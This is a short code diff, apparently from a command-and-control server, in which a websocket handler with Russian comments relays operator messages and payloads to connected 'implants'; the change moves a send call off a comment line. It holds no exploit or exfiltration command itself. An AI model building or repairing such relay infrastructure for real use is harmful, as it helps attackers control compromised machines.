@@ -48,7 +48,8 @@ async def websocket_handler(request):
                         # Вскрываем конверт и отправляем ТОЛЬКО payload
                         await IMPLANTS[target_id].send_json(data.get('payload'))
                     else:
-                        # Остальные типы сообщений (как get_details) отправляем целиком                        await IMPLANTS[target_id].send_json(data)
+                        # Остальные типы сообщений (как get_details) отправляем целиком
+                        await IMPLANTS[target_id].send_json(data)
 
             elif client_type == 'implant':
                 if OPERATOR and not OPERATOR.closed:
